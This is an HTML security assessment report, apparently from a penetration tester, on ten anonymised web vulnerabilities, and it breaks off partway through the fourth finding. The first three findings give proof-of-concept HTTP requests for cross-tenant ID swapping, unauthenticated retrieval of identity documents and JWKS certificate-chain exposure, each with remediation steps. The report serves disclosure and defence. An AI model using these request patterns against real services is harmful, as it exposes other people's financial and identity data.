@@ -1,0 +1,1340 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Executive Security Assessment & Penetration Testing Report | Kanan Gandhi</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap');
+
+    @page {
+      size: A4 portrait;
+      margin: 18mm 14mm 18mm 14mm;
+      @bottom-left {
+        content: "CONFIDENTIAL // Web Security & QA Assessment Report";
+        font-family: 'Inter', sans-serif;
+        font-size: 8pt;
+        color: #64748b;
+      }
+      @bottom-right {
+        content: "Page " counter(page);
+        font-family: 'Inter', sans-serif;
+        font-size: 8pt;
+        color: #64748b;
+        font-weight: 600;
+      }
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      font-size: 9.5pt;
+      line-height: 1.55;
+      color: #1e293b;
+      background-color: #ffffff;
+      -webkit-print-color-adjust: exact !important;
+      print-color-adjust: exact !important;
+    }
+
+    .page-break {
+      page-break-before: always;
+      break-before: page;
+    }
+
+    .no-break {
+      page-break-inside: avoid;
+      break-inside: avoid;
+    }
+
+    /* Cover Page */
+    .cover-container {
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      padding: 30mm 15mm 20mm 15mm;
+      border-left: 6px solid #0f172a;
+      background: linear-gradient(135deg, #f8fafc 0%, #ffffff 100%);
+    }
+
+    .cover-badge {
+      display: inline-block;
+      padding: 4px 12px;
+      font-size: 8pt;
+      font-family: 'JetBrains Mono', monospace;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      background-color: #0f172a;
+      color: #38bdf8;
+      border-radius: 4px;
+      margin-bottom: 25px;
+    }
+
+    .cover-title {
+      font-size: 26pt;
+      font-weight: 800;
+      line-height: 1.2;
+      color: #0f172a;
+      margin-bottom: 12px;
+      letter-spacing: -0.5px;
+    }
+
+    .cover-subtitle {
+      font-size: 13pt;
+      font-weight: 500;
+      color: #475569;
+      line-height: 1.4;
+      margin-bottom: 40px;
+    }
+
+    .cover-stats-grid {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 12px;
+      margin: 30px 0;
+    }
+
+    .cover-stat-box {
+      background: #ffffff;
+      border: 1px solid #e2e8f0;
+      border-radius: 8px;
+      padding: 14px;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+    }
+
+    .cover-stat-val {
+      font-size: 18pt;
+      font-weight: 800;
+      font-family: 'JetBrains Mono', monospace;
+      color: #0f172a;
+    }
+
+    .cover-stat-label {
+      font-size: 7.5pt;
+      color: #64748b;
+      text-transform: uppercase;
+      font-weight: 600;
+      margin-top: 4px;
+    }
+
+    .cover-meta {
+      border-top: 1px solid #e2e8f0;
+      padding-top: 25px;
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 20px;
+      font-size: 9pt;
+    }
+
+    .cover-meta-item strong {
+      display: block;
+      color: #0f172a;
+      font-size: 9.5pt;
+    }
+
+    .cover-meta-item span {
+      color: #64748b;
+      font-size: 8.5pt;
+    }
+
+    /* Document Structure */
+    h1, h2, h3, h4 {
+      color: #0f172a;
+      font-weight: 700;
+    }
+
+    h1 {
+      font-size: 16pt;
+      border-bottom: 2px solid #0f172a;
+      padding-bottom: 6px;
+      margin-top: 0;
+      margin-bottom: 14px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    h2 {
+      font-size: 12pt;
+      margin-top: 16px;
+      margin-bottom: 8px;
+      color: #1e293b;
+    }
+
+    h3 {
+      font-size: 10pt;
+      margin-top: 12px;
+      margin-bottom: 6px;
+      color: #334155;
+    }
+
+    p {
+      margin-bottom: 8px;
+      text-align: justify;
+    }
+
+    /* Badges */
+    .badge {
+      display: inline-block;
+      padding: 2px 7px;
+      font-size: 7.5pt;
+      font-weight: 700;
+      font-family: 'JetBrains Mono', monospace;
+      border-radius: 4px;
+      text-transform: uppercase;
+    }
+
+    .badge-critical {
+      background-color: #fee2e2;
+      color: #b91c1c;
+      border: 1px solid #fca5a5;
+    }
+
+    .badge-high {
+      background-color: #ffedd5;
+      color: #c2410c;
+      border: 1px solid #fdba74;
+    }
+
+    .badge-medium {
+      background-color: #fef3c7;
+      color: #b45309;
+      border: 1px solid #fde68a;
+    }
+
+    .badge-low {
+      background-color: #e0f2fe;
+      color: #0369a1;
+      border: 1px solid #bae6fd;
+    }
+
+    .badge-info {
+      background-color: #f1f5f9;
+      color: #475569;
+      border: 1px solid #cbd5e1;
+    }
+
+    /* Tables */
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin: 10px 0 16px 0;
+      font-size: 8.5pt;
+    }
+
+    th {
+      background-color: #0f172a;
+      color: #ffffff;
+      text-align: left;
+      padding: 7px 9px;
+      font-weight: 600;
+      font-size: 8pt;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    td {
+      padding: 6px 9px;
+      border-bottom: 1px solid #e2e8f0;
+      vertical-align: middle;
+    }
+
+    tr:nth-child(even) td {
+      background-color: #f8fafc;
+    }
+
+    /* Callout & Metadata Boxes */
+    .callout {
+      background-color: #f8fafc;
+      border-left: 4px solid #38bdf8;
+      padding: 9px 12px;
+      margin: 10px 0;
+      border-radius: 0 6px 6px 0;
+      font-size: 8.5pt;
+    }
+
+    .callout-warning {
+      background-color: #fffbeb;
+      border-left-color: #f59e0b;
+      color: #92400e;
+    }
+
+    .callout-danger {
+      background-color: #fef2f2;
+      border-left-color: #ef4444;
+      color: #991b1b;
+    }
+
+    .finding-meta-grid {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 8px;
+      background: #f1f5f9;
+      border: 1px solid #e2e8f0;
+      border-radius: 6px;
+      padding: 8px 12px;
+      margin-bottom: 12px;
+      font-size: 8pt;
+      font-family: 'JetBrains Mono', monospace;
+    }
+
+    .finding-meta-item strong {
+      display: block;
+      color: #64748b;
+      font-size: 7pt;
+      text-transform: uppercase;
+      margin-bottom: 2px;
+    }
+
+    .finding-meta-item span {
+      color: #0f172a;
+      font-weight: 600;
+    }
+
+    /* Code blocks */
+    pre, code {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 7.8pt;
+    }
+
+    pre {
+      background-color: #0f172a;
+      color: #e2e8f0;
+      padding: 9px 12px;
+      border-radius: 6px;
+      margin: 8px 0;
+      overflow-x: auto;
+      line-height: 1.4;
+      border: 1px solid #1e293b;
+    }
+
+    code {
+      background-color: #f1f5f9;
+      color: #0f172a;
+      padding: 1px 4px;
+      border-radius: 3px;
+      border: 1px solid #e2e8f0;
+    }
+
+    pre code {
+      background-color: transparent;
+      color: inherit;
+      padding: 0;
+      border: none;
+    }
+
+    .token-keyword { color: #f43f5e; font-weight: bold; }
+    .token-str { color: #38bdf8; }
+    .token-num { color: #f59e0b; }
+    .token-comment { color: #64748b; font-style: italic; }
+
+    /* Lists */
+    ul, ol {
+      margin-left: 18px;
+      margin-bottom: 10px;
+    }
+
+    li {
+      margin-bottom: 4px;
+    }
+
+    .remediation-box {
+      background: #f0fdf4;
+      border: 1px solid #bbf7d0;
+      border-radius: 6px;
+      padding: 10px 14px;
+      margin-top: 10px;
+    }
+
+    .remediation-box h4 {
+      color: #166534;
+      font-size: 9pt;
+      margin-bottom: 6px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .qa-box {
+      background: #f8fafc;
+      border: 1px solid #cbd5e1;
+      border-radius: 6px;
+      padding: 10px 14px;
+      margin-top: 8px;
+    }
+
+    .qa-box h4 {
+      color: #334155;
+      font-size: 9pt;
+      margin-bottom: 6px;
+    }
+
+    /* Severity Indicators */
+    .sev-dot {
+      display: inline-block;
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      margin-right: 5px;
+    }
+    .sev-dot.critical { background: #dc2626; }
+    .sev-dot.high { background: #ea580c; }
+    .sev-dot.medium { background: #d97706; }
+    .sev-dot.low { background: #0284c7; }
+  </style>
+</head>
+<body>
+
+  <!-- =================================================== -->
+  <!-- COVER PAGE                                          -->
+  <!-- =================================================== -->
+  <div class="cover-container">
+    <div>
+      <div class="cover-badge">Enterprise Security Assessment Report</div>
+      <h1 class="cover-title" style="border:none; padding:0; margin-bottom:15px;">
+        Web Application Security &amp; QA Pentest Audit
+      </h1>
+      <p class="cover-subtitle">
+        Comprehensive Vulnerability Assessment, Attack Surface Analysis, and Remediation Verification Across Enterprise Cloud &amp; API Ingress Systems.
+      </p>
+
+      <div class="cover-stats-grid">
+        <div class="cover-stat-box">
+          <div class="cover-stat-val">10</div>
+          <div class="cover-stat-label">Total Findings</div>
+        </div>
+        <div class="cover-stat-box" style="border-top: 3px solid #dc2626;">
+          <div class="cover-stat-val" style="color: #dc2626;">2</div>
+          <div class="cover-stat-label">Critical Severity</div>
+        </div>
+        <div class="cover-stat-box" style="border-top: 3px solid #ea580c;">
+          <div class="cover-stat-val" style="color: #ea580c;">5</div>
+          <div class="cover-stat-label">High Severity</div>
+        </div>
+        <div class="cover-stat-box" style="border-top: 3px solid #0284c7;">
+          <div class="cover-stat-val" style="color: #0284c7;">3</div>
+          <div class="cover-stat-label">Medium &amp; Low/P5</div>
+        </div>
+      </div>
+    </div>
+
+    <div>
+      <div class="callout callout-warning" style="margin-bottom: 25px;">
+        <strong>OPSEC &amp; DATA PRIVACY NOTICE:</strong> All corporate target identities, production hostnames, client credentials, and internal IP subnets documented within this report have been strictly sanitized and anonymized (e.g. <code>[REDACTED]</code>) in full compliance with Responsible Disclosure, NDA standards, and bug bounty policies.
+      </div>
+
+      <div class="cover-meta">
+        <div class="cover-meta-item">
+          <strong>Lead Security &amp; QA Auditor</strong>
+          <span>Kanan Gandhi</span>
+          <span>Web Application Security &amp; QA Consultant</span>
+          <span>Email: kanangandhi62@gmail.com</span>
+          <span>LinkedIn: linkedin.com/in/kanan-gandhi-159449a2/</span>
+        </div>
+        <div class="cover-meta-item">
+          <strong>Engagement Details</strong>
+          <span>Assessment Framework: OWASP Top 10 / WSTG v4.2 / PTES</span>
+          <span>Classification: Commercial-in-Confidence // Restricted</span>
+          <span>Report Version: v1.0 (Final Enterprise Advisory)</span>
+          <span>Audit Period: March 2026 – June 2026</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- =================================================== -->
+  <!-- TABLE OF CONTENTS & EXECUTIVE SUMMARY                -->
+  <!-- =================================================== -->
+  <div class="page-break"></div>
+
+  <h1>
+    <span>1. Executive Summary</span>
+    <span style="font-size: 8pt; font-family: 'JetBrains Mono'; color: #64748b; font-weight: normal;">SECTION 01</span>
+  </h1>
+
+  <p>
+    During the multi-stage security evaluation conducted between <strong>March 2026 and June 2026</strong>, a comprehensive Web Application Security Assessment and Quality Assurance (QA) Pentest was executed across external attack surfaces, multi-tenant cloud backends, API ingress gateways, and authentication perimeters.
+  </p>
+
+  <p>
+    The assessment combined rigorous automated scanning, manual source code verification, cryptographic inspection, and multi-tenant authorization testing. The assessment identified a total of <strong>10 distinct security findings</strong>, ranging from architectural authorization breakdowns to critical cryptographic trust exposures and edge firewall bypasses.
+  </p>
+
+  <div class="callout" style="margin: 14px 0;">
+    <strong>Key Security Takeaway:</strong> Modern perimeter defenses (e.g., Akamai WAF, CDN edge layers) are frequently rendered ineffective when backend origin infrastructure is directly addressable, or when application logic fails to cryptographically bind authorization claims at the data persistence tier.
+  </div>
+
+  <h2>Severity Distribution &amp; Risk Posture</h2>
+  <p>
+    Of the 10 vulnerabilities identified, <strong>70% represent Critical or High business risks</strong> that directly enable unauthorized cross-tenant data exfiltration, full account takeover, or foundational infrastructure compromise:
+  </p>
+
+  <table>
+    <thead>
+      <tr>
+        <th style="width: 15%;">Severity</th>
+        <th style="width: 12%;">Count</th>
+        <th style="width: 15%;">Percentage</th>
+        <th style="width: 18%;">CVSS Range</th>
+        <th>Primary Impact Summary</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><span class="badge badge-critical">Critical</span></td>
+        <td><strong>2</strong></td>
+        <td>20%</td>
+        <td>9.1 – 9.3</td>
+        <td>Complete PKI trust chain disclosure; unauthenticated cloud storage data exfiltration.</td>
+      </tr>
+      <tr>
+        <td><span class="badge badge-high">High</span></td>
+        <td><strong>5</strong></td>
+        <td>50%</td>
+        <td>7.5 – 8.5</td>
+        <td>Multi-tenant BOLA, hardcoded OAuth client secrets, session overwrites, and WAF bypass.</td>
+      </tr>
+      <tr>
+        <td><span class="badge badge-medium">Medium</span></td>
+        <td><strong>1</strong></td>
+        <td>10%</td>
+        <td>6.5</td>
+        <td>Cleartext HTTP credential transmission over port 80 &amp; SSO topology disclosure.</td>
+      </tr>
+      <tr>
+        <td><span class="badge badge-low">Low / P5</span></td>
+        <td><strong>2</strong></td>
+        <td>20%</td>
+        <td>3.8 – 5.3</td>
+        <td>Missing server-side legal consent enforcement; EOL framework with unpatched CVEs.</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <h2>OWASP Top 10 (2021) Mapping</h2>
+  <ul>
+    <li><strong>A01:2021 – Broken Access Control:</strong> 3 Findings (BOLA in E-Commerce API, Unauthenticated S3 Access, Unrestricted GraphQL User Registration).</li>
+    <li><strong>A02:2021 – Cryptographic Failures:</strong> 2 Findings (JWKS x5c Root CA Exposure, Cleartext HTTP Login Form Action).</li>
+    <li><strong>A05:2021 – Security Misconfiguration:</strong> 2 Findings (WAF Bypass via Leaked Origin IP, Overly Permissive CORS Wildcard).</li>
+    <li><strong>A06:2021 – Vulnerable and Outdated Components:</strong> 1 Finding (End-of-Life Apache Cocoon 2.0.4 with Critical XXE &amp; SQLi CVEs).</li>
+    <li><strong>A07:2021 – Identification &amp; Authentication Failures:</strong> 2 Findings (React Bundle OAuth Secret Exposure, Session Overwrite Account Switching).</li>
+  </ul>
+
+  <!-- =================================================== -->
+  <!-- COMPLETE VULNERABILITY REGISTER TABLE                -->
+  <!-- =================================================== -->
+  <div class="page-break"></div>
+
+  <h1>
+    <span>2. Complete Vulnerability Register</span>
+    <span style="font-size: 8pt; font-family: 'JetBrains Mono'; color: #64748b; font-weight: normal;">SECTION 02</span>
+  </h1>
+
+  <p>The following table summarizes all 10 verified vulnerabilities identified during the assessment period:</p>
+
+  <table>
+    <thead>
+      <tr>
+        <th style="width: 10%;">ID</th>
+        <th style="width: 32%;">Vulnerability Title</th>
+        <th style="width: 25%;">Target Domain / Sector</th>
+        <th style="width: 15%;">Severity</th>
+        <th style="width: 10%;">CVSS</th>
+        <th style="width: 8%;">Status</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><code>SEC-01</code></td>
+        <td><strong>Broken Object Level Authorization (BOLA) in Analytics API</strong></td>
+        <td>Enterprise E-Commerce Platform</td>
+        <td><span class="badge badge-high">High</span></td>
+        <td><strong>8.5</strong></td>
+        <td><span style="color:#16a34a; font-weight:600;">Resolved</span></td>
+      </tr>
+      <tr>
+        <td><code>SEC-02</code></td>
+        <td><strong>Unauthenticated Cloud Storage Exfiltration via CORS &amp; IDOR</strong></td>
+        <td>International Ride-Hailing Platform</td>
+        <td><span class="badge badge-critical">Critical</span></td>
+        <td><strong>9.1</strong></td>
+        <td><span style="color:#16a34a; font-weight:600;">Resolved</span></td>
+      </tr>
+      <tr>
+        <td><code>SEC-03</code></td>
+        <td><strong>Public Exposure of Internal PKI Trust Chain via JWKS x5c</strong></td>
+        <td>Multinational Retail Conglomerate</td>
+        <td><span class="badge badge-critical">Critical</span></td>
+        <td><strong>9.3</strong></td>
+        <td><span style="color:#16a34a; font-weight:600;">Resolved</span></td>
+      </tr>
+      <tr>
+        <td><code>SEC-04</code></td>
+        <td><strong>Hardcoded OAuth2 Client Secret in Compiled SPA React Bundle</strong></td>
+        <td>Global Hospitality Management System</td>
+        <td><span class="badge badge-high">High</span></td>
+        <td><strong>8.2</strong></td>
+        <td><span style="color:#16a34a; font-weight:600;">Resolved</span></td>
+      </tr>
+      <tr>
+        <td><code>SEC-05</code></td>
+        <td><strong>Dynamic Account Switching &amp; Session Hijacking via Overwrite</strong></td>
+        <td>Healthcare &amp; Genetic Analytics</td>
+        <td><span class="badge badge-high">High</span></td>
+        <td><strong>8.0</strong></td>
+        <td><span style="color:#16a34a; font-weight:600;">Resolved</span></td>
+      </tr>
+      <tr>
+        <td><code>SEC-06</code></td>
+        <td><strong>Unauthenticated GraphQL Registration &amp; JWT Minting</strong></td>
+        <td>Pan-African Mobile Banking Platform</td>
+        <td><span class="badge badge-high">High</span></td>
+        <td><strong>7.5</strong></td>
+        <td><span style="color:#16a34a; font-weight:600;">Resolved</span></td>
+      </tr>
+      <tr>
+        <td><code>SEC-07</code></td>
+        <td><strong>Missing Server-Side Validation of Terms of Service Acceptance</strong></td>
+        <td>EdTech &amp; Online Learning Platform</td>
+        <td><span class="badge badge-low">Low / QA</span></td>
+        <td><strong>3.8</strong></td>
+        <td><span style="color:#16a34a; font-weight:600;">Resolved</span></td>
+      </tr>
+      <tr>
+        <td><code>SEC-08</code></td>
+        <td><strong>Direct Origin Ingress &amp; WAF Bypass via Latency Header Leaks</strong></td>
+        <td>Connected Vehicle &amp; EV Enterprise</td>
+        <td><span class="badge badge-high">High</span></td>
+        <td><strong>7.5</strong></td>
+        <td><span style="color:#16a34a; font-weight:600;">Resolved</span></td>
+      </tr>
+      <tr>
+        <td><code>SEC-09</code></td>
+        <td><strong>Exposure of EOL Apache Cocoon (2.0.4) &amp; Critical CVE Vectors</strong></td>
+        <td>National Telecommunications Provider</td>
+        <td><span class="badge badge-low">P5 / Low</span></td>
+        <td><strong>5.3</strong></td>
+        <td><span style="color:#16a34a; font-weight:600;">Resolved</span></td>
+      </tr>
+      <tr>
+        <td><code>SEC-10</code></td>
+        <td><strong>Cleartext Credential Transmission via Hardcoded HTTP Form Action</strong></td>
+        <td>National Mobile &amp; Telecom Carrier</td>
+        <td><span class="badge badge-medium">Medium / P4</span></td>
+        <td><strong>6.5</strong></td>
+        <td><span style="color:#16a34a; font-weight:600;">Resolved</span></td>
+      </tr>
+    </tbody>
+  </table>
+
+  <h2>Risk Matrix &amp; Assessment Methodology</h2>
+  <p>
+    Vulnerabilities were graded using the <strong>Common Vulnerability Scoring System (CVSS v3.1)</strong> standard, taking into account Exploitability Metrics (Attack Vector, Attack Complexity, Privileges Required, User Interaction) and Impact Metrics (Confidentiality, Integrity, Availability):
+  </p>
+
+  <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 8px;">
+    <div class="callout" style="border-left-color: #dc2626;">
+      <strong>Critical Severity (CVSS 9.0 - 10.0):</strong>
+      Direct, remote, unauthenticated access to corporate core infrastructure or mass sensitive customer data stores with zero user interaction.
+    </div>
+    <div class="callout" style="border-left-color: #ea580c;">
+      <strong>High Severity (CVSS 7.0 - 8.9):</strong>
+      Privilege escalation, cross-tenant data leaks, credential theft, or bypass of perimeter defense mechanisms requiring minimal privileges.
+    </div>
+  </div>
+
+  <!-- =================================================== -->
+  <!-- DETAILED FINDING: SEC-01                             -->
+  <!-- =================================================== -->
+  <div class="page-break"></div>
+
+  <h1>
+    <span>3. In-Depth Technical Advisories</span>
+    <span style="font-size: 8pt; font-family: 'JetBrains Mono'; color: #64748b; font-weight: normal;">DETAILED REPORTS</span>
+  </h1>
+
+  <div class="no-break">
+    <h2>SEC-01: Broken Object Level Authorization (BOLA) in Multi-Tenant Analytics API</h2>
+    
+    <div class="finding-meta-grid">
+      <div class="finding-meta-item">
+        <strong>Severity / CVSS</strong>
+        <span><span class="badge badge-high">HIGH 8.5</span> (CVSS:3.1)</span>
+      </div>
+      <div class="finding-meta-item">
+        <strong>Vulnerability Class</strong>
+        <span>CWE-639 / OWASP API1:2023</span>
+      </div>
+      <div class="finding-meta-item">
+        <strong>Target Environment</strong>
+        <span>Enterprise E-Commerce Platform</span>
+      </div>
+      <div class="finding-meta-item">
+        <strong>Target Endpoint</strong>
+        <span><code>GET /api/v2/supplier/analytics/</code></span>
+      </div>
+    </div>
+
+    <h3>Vulnerability Overview</h3>
+    <p>
+      During an API authorization audit of a multi-tenant supplier management backend, a Broken Object Level Authorization (BOLA / IDOR) vulnerability was identified on the supplier analytics reporting service. While the API required a valid supplier JWT for authentication, the backend service relied solely on a client-controlled query parameter (<code>supplier_id</code>) to query business intelligence metrics, without validating that the authenticated user possessed authorization claims for the requested tenant.
+    </p>
+
+    <h3>Proof of Concept (PoC)</h3>
+    <p>An attacker authenticated with legitimate Supplier Account A (<code>supplier_id: 14092</code>) transmits a request querying competitor Supplier B (<code>supplier_id: 98412</code>):</p>
+
+    <pre><code><span class="token-keyword">GET</span> /api/v2/supplier/analytics/summary?supplier_id=98412&amp;interval=30d HTTP/2
+Host: partner-api.[redacted-ecommerce].com
+Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.[REDACTED_SUPPLIER_A_TOKEN]
+Accept: application/json
+
+<span class="token-comment">--- [SERVER RESPONSE: HTTP/2 200 OK] ---</span>
+{
+  "status": "success",
+  "data": {
+    "supplier_id": 98412,
+    "legal_entity": "Competitor Logistics Group [REDACTED]",
+    "total_gross_merchandise_value": 4829104.50,
+    "total_orders": 39820,
+    "commission_rate": 0.085,
+    "pending_bank_payout": 410472.00,
+    "payout_account_iban": "GB82BARC20[REDACTED]"
+  }
+}</code></pre>
+
+    <h3>Threat &amp; Business Impact</h3>
+    <p>
+      An untrusted merchant on the e-commerce platform could write a simple script iterating over <code>supplier_id</code> sequences to exfiltrate proprietary financial analytics, order volumes, payout schedules, and bank routing identifiers for every merchant operating on the platform.
+    </p>
+
+    <div class="remediation-box">
+      <h4>🛡️ Remediation Plan</h4>
+      <ul>
+        <li><strong>Enforce Tenancy Claim Validation:</strong> Extract the tenant/supplier identifier exclusively from cryptographically signed JWT token claims (e.g. <code>request.user.supplier_id</code>) rather than client-supplied query parameters.</li>
+        <li><strong>Enforce Object-Level Access Control (ABAC):</strong> Implement an authorization middleware layer (e.g., OPA or Spring Security PreAuthorize) verifying relationship ownership before database retrieval.</li>
+      </ul>
+    </div>
+
+    <div class="qa-box">
+      <h4>🧪 QA Verification Test Case</h4>
+      <p>
+        <strong>Automated Test:</strong> Generate 2 distinct test vendor accounts (User A, User B). Send authenticated GET requests from User A specifying User B's <code>supplier_id</code>. Verify the server immediately responds with <code>HTTP 403 Forbidden</code> and logs a security alert.
+      </p>
+    </div>
+  </div>
+
+  <!-- =================================================== -->
+  <!-- DETAILED FINDING: SEC-02                             -->
+  <!-- =================================================== -->
+  <div class="page-break"></div>
+
+  <div class="no-break">
+    <h2>SEC-02: Unauthenticated Cloud Storage Exfiltration via CORS Wildcard &amp; IDOR</h2>
+    
+    <div class="finding-meta-grid">
+      <div class="finding-meta-item">
+        <strong>Severity / CVSS</strong>
+        <span><span class="badge badge-critical">CRITICAL 9.1</span> (CVSS:3.1)</span>
+      </div>
+      <div class="finding-meta-item">
+        <strong>Vulnerability Class</strong>
+        <span>CWE-284 / CWE-942 (OWASP A01)</span>
+      </div>
+      <div class="finding-meta-item">
+        <strong>Target Environment</strong>
+        <span>International Ride-Hailing Platform</span>
+      </div>
+      <div class="finding-meta-item">
+        <strong>Target Endpoint</strong>
+        <span><code>GET /api/v1/files/{file_uuid}</code></span>
+      </div>
+    </div>
+
+    <h3>Vulnerability Overview</h3>
+    <p>
+      During a cloud storage asset review, an unauthenticated object exfiltration flaw was identified on the production document retrieval endpoint. Driver and rider KYC identity documents (driver's licenses, passports, vehicle registration cards, and insurance contracts) stored in AWS S3 buckets were exposed via a public proxy API that required zero authentication. Furthermore, the endpoint reflected <code>Access-Control-Allow-Origin: *</code>, and the file identifiers followed sequential UUIDv7 millisecond timestamps.
+    </p>
+
+    <h3>Proof of Concept (PoC)</h3>
+    <p>An unauthenticated attacker sends a direct HTTP GET request to the file proxy service:</p>
+
+    <pre><code><span class="token-keyword">GET</span> /api/v1/files/018e47b2-a4f1-729a-b42e-[REDACTED] HTTP/2
+Host: cdn-storage.[redacted-ridehailing].com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+
+<span class="token-comment">--- [SERVER RESPONSE: HTTP/2 200 OK] ---</span>
+Content-Type: image/jpeg
+Content-Length: 1420914
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Methods: GET, OPTIONS
+Cache-Control: public, max-age=86400
+
+[BINARY JPEG STREAM: VERIFIED HIGH-RESOLUTION NATIONAL DRIVER LICENSE SCAN]</code></pre>
+
+    <h3>Threat &amp; Business Impact</h3>
+    <p>
+      Mass exposure of government-issued identity documents for millions of global drivers. Enables identity theft, synthetic identity fraud, and massive regulatory fines under GDPR, CCPA, and national privacy legislation.
+    </p>
+
+    <div class="remediation-box">
+      <h4>🛡️ Remediation Plan</h4>
+      <ul>
+        <li><strong>Mandate Authentication on File Ingress:</strong> Require valid session cookies or Bearer tokens before streaming files from backend storage.</li>
+        <li><strong>Deploy HMAC Pre-Signed URLs:</strong> Generate short-lived (e.g. 5-minute expiry) S3 pre-signed URLs scoped strictly to the authorized user's session.</li>
+        <li><strong>Restrict CORS Policy:</strong> Remove wildcard (<code>*</code>) headers and restrict origins exclusively to verified first-party platform web applications.</li>
+      </ul>
+    </div>
+
+    <div class="qa-box">
+      <h4>🧪 QA Verification Test Case</h4>
+      <p>
+        <strong>Automated Test:</strong> Send unauthenticated curl requests to <code>/api/v1/files/{uuid}</code>. Confirm server responds with <code>HTTP 401 Unauthorized</code>. Verify that cross-origin requests from <code>https://evil.com</code> are blocked by browser CORS enforcement.
+      </p>
+    </div>
+  </div>
+
+  <!-- =================================================== -->
+  <!-- DETAILED FINDING: SEC-03                             -->
+  <!-- =================================================== -->
+  <div class="page-break"></div>
+
+  <div class="no-break">
+    <h2>SEC-03: Public Exposure of Internal PKI Trust Hierarchy via JWKS x5c Parameter</h2>
+    
+    <div class="finding-meta-grid">
+      <div class="finding-meta-item">
+        <strong>Severity / CVSS</strong>
+        <span><span class="badge badge-critical">CRITICAL 9.3</span> (CVSS:3.1)</span>
+      </div>
+      <div class="finding-meta-item">
+        <strong>Vulnerability Class</strong>
+        <span>CWE-200 / CWE-295 (OWASP A02)</span>
+      </div>
+      <div class="finding-meta-item">
+        <strong>Target Environment</strong>
+        <span>Multinational Retail &amp; Fashion Conglomerate</span>
+      </div>
+      <div class="finding-meta-item">
+        <strong>Target Endpoint</strong>
+        <span><code>GET /oauth2/connect/jwk_uri</code></span>
+      </div>
+    </div>
+
+    <h3>Vulnerability Overview</h3>
+    <p>
+      An audit of an enterprise OpenAM identity provider discovered that the public JSON Web Key Set (JWKS) endpoint leaked complete X.509 certificate chains within the <code>x5c</code> array. Certificate extensions (Authority Information Access and CRL Distribution Points) exposed public IP addresses (<code>195.77.x.x</code>) of internal Microsoft Active Directory Certificate Services (AD CS) servers. The auditor was able to publicly download the Root CA certificate, Intermediate CA, a 15,494-byte Certificate Revocation List (CRL), and execute unauthenticated OCSP requests.
+    </p>
+
+    <h3>Proof of Concept (PoC)</h3>
+    <p>Querying the public JWKS endpoint reveals the internal cryptographic certificate hierarchy:</p>
+
+    <pre><code><span class="token-keyword">GET</span> /oauth2/connect/jwk_uri HTTP/2
+Host: sso.[redacted-retail].com
+
+<span class="token-comment">--- [SERVER RESPONSE: HTTP/2 200 OK] ---</span>
+{
+  "keys": [{
+    "kty": "RSA",
+    "kid": "prod-auth-signer-2026",
+    "use": "sig",
+    "x5c": [
+      "MIIFvTCCA6WgAwIBAgITGAAAAA[REDACTED_LEAF_CERTIFICATE]...",
+      "MIIE/TCCA+WgAwIBAgITFAAAAA[REDACTED_INTERMEDIATE_CA]...",
+      "MIIE1jCCAr6gAwIBAgITDAAAAA[REDACTED_ROOT_CA_CERTIFICATE]..."
+    ]
+  }]
+}
+
+<span class="token-comment"># Extracting AIA &amp; CRL Extensions reveals internal endpoints resolving publicly:</span>
+<span class="token-str">CRL URI:</span> http://195.77.x.x/CertEnroll/INTERNAL-ENTERPRISE-CA.crl (15,494 bytes downloaded)
+<span class="token-str">OCSP URI:</span> http://195.77.x.x/ocsp (HTTP 200 OK on OCSP query)</code></pre>
+
+    <h3>Threat &amp; Business Impact</h3>
+    <p>
+      Complete architectural intelligence leakage of the enterprise Public Key Infrastructure (PKI). Adversaries gain internal hostnames, corporate network naming conventions (<code>*.central.[redacted].grp</code>), and Intermediate CA certificates that facilitate targeted Man-in-the-Middle (MITM) attacks if chained with local network or DNS compromises.
+    </p>
+
+    <div class="remediation-box">
+      <h4>🛡️ Remediation Plan</h4>
+      <ul>
+        <li><strong>Strip x5c Parameter from JWKS:</strong> Configure OpenAM/Keycloak to return only standard public cryptographic components (<code>kty</code>, <code>n</code>, <code>e</code>, <code>kid</code>).</li>
+        <li><strong>Isolate Enterprise PKI Infrastructure:</strong> Restrict all AD CS, CRL distribution points, and OCSP responders behind internal VPNs / corporate firewalls with zero public ingress.</li>
+      </ul>
+    </div>
+
+    <div class="qa-box">
+      <h4>🧪 QA Verification Test Case</h4>
+      <p>
+        <strong>Automated Test:</strong> Execute automated JSON schema validation on <code>/oauth2/connect/jwk_uri</code>. Confirm the <code>x5c</code> key does not exist in any key object within the response.
+      </p>
+    </div>
+  </div>
+
+  <!-- =================================================== -->
+  <!-- DETAILED FINDING: SEC-04                             -->
+  <!-- =================================================== -->
+  <div class="page-break"></div>
+
+  <div class="no-break">
+    <h2>SEC-04: Hardcoded OAuth2 Client Secret in Compiled SPA React Bundle</h2>
+    
+    <div class="finding-meta-grid">
+      <div class="finding-meta-item">
+        <strong>Severity / CVSS</strong>
